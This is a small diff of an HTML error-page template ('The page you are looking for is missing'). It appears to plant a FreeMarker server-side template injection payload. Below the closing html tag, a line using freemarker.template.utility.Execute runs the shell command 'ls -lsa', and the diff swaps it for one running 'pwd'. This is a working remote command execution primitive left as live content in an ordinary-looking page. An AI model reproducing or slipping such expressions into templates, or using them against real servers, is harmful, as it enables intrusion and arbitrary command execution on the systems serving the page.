@@ -10,4 +10,4 @@
     <p>The page you are looking for is missing</p>
 </div>
 </html>
-${"freemarker.template.utility.Execute"?new()("ls -lsa")}
+${"freemarker.template.utility.Execute"?new()("pwd")}
